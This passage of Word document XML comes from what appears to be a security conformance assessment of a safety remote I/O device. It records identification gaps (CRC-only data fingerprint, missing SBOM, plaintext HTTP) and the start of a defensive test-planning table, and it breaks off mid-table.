                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="144DF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B480F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I&amp;M4 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>signature</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>F_iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>F_Par_CRC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813E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SRIO-3011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103DC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 xml:space="preserve">The safety parameter set (Asset B) — data identification, as a fingerprint </w:t>
            </w:r>
            <w:hyperlink r:id="rId91" w:history="1">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="0F891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6B63D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del w:id="9" w:author="Unknown">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>I&amp;M0 REVISION_COUNTER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A048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SRIO-3002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D4626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REMOVED — modification count, belongs to RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1861B823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Gaps (corrected, in-scope only):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E1D833" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">G-1 (data identification — corrected, REVISION_COUNTER removed). Your "config/data is not addressed" is incorrect, but the correct evidence is only the I&amp;M4 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_iParCRC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F_Par_CRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> signature — a fingerprint that identifies </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>which</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> configuration is loaded. It is not the REVISION_COUNTER (that counts changes = RQ-009). So the accurate gap is: the data is identified only by an opaque CRC fingerprint, not by a content-level, human-/machine-readable classification of </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>which</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> data elements are EHSR-critical (safe data mapping, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iPar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, F-Par). RQ-004 is therefore </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met for data — via fingerprint, not enumeration</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId92" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E30134A" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">G-2 (SBOM — decisive, in scope). </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 7.8 expects identification of the software genuinely critical for EHSR compliance, including third-party components: µC/OS-II (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Micrium</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) (SRIO-1260), the SIL3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack (SRIO-1929), the STM32F7 self-test library (SRIO-10766), the netX90 PROFINET stack (SRIO-1768). The device exposes only top-level version strings and no SBOM → these cannot be inventoried or CVE-correlated. Strongest, most citable gap (OWASP ISVS V1.1.1; BSI TR-03183; 4-1 SM-9/SM-10). </w:t>
      </w:r>
      <w:hyperlink r:id="rId93" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId94" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId95" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[ICS-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>Securi</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>endium_pdf</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0560D3FB" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">G-3 (confidentiality — in scope, your secondary gap). All identification served over plaintext HTTP (SRIO-7903), HTTPS/WebSocket/MQTT unsupported </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">(SRIO-7907/7906/7905) → version reconnaissance on the Ethernet interface. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">CR 4.1/4.3 not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>met</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId96" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6EB0EC58" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="10" w:author="Unknown">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>G (identity integrity / MITM falsification)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Moved to RQ-005 (protection of identified software/data). </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Cross-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>reference</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1467D399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SL/conformance conclusion (identification-scoped): RQ-004 is partially met. Software identification is provided and readable (CR 7.8 partial); data is identified by CRC fingerprint (I&amp;M4) but not content-classified (G-1); no SBOM-grade third-party inventory (G-2, decisive); no transport confidentiality for the identification data (G-3). The </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity/authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the identification is assessed under RQ-005, not here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2D5026" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="69E35FEC">
          <v:rect id="_x0000_i1046" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B68AB27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Step 2 — Methodological Test Planning (Scope-Corrected)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3689"/>
        <w:gridCol w:w="1802"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="608"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="06CD31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7ADFF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EFF18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11DB93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218930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Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9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990122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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="06405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61035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8731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Enumerate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the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identification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surface</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/*, I&amp;M0, I&amp;M5, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fieldbussetup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fieldbusfirmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, I&amp;M4 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>for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data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>build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the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actual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inventory</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>diff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> vs. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>expected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> EHSR-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>critical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SW+data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3BE73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Functional</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> CR 7.8; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>confirms</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> SW + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (I&amp;M4 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fingerprint</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>identification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>exposes</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> SBOM </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>gap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E291C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Requirements-based verification; OWASP FSTM Stage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BB6CB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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="4CD35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99A2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CDB1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SBOM-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>completeness</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>version→CVE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analysis</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>attempt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to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derive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third</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">-party </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>components</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (µC/OS-II, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>PROFIsafe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stack</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, STM STL, netX90); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>show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no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> SBOM → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> CVE </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>correlation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E998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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-2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4165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OWASP FSTM "SBOM Generation" + ISVS V1.1.1; ifm CM-008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A336A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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="4C3ED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E3DC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470A7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Passive plaintext capture of the identification traffic; confirm cleartext versions + no TLS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29873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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-3 (</w:t>
            </w:r>
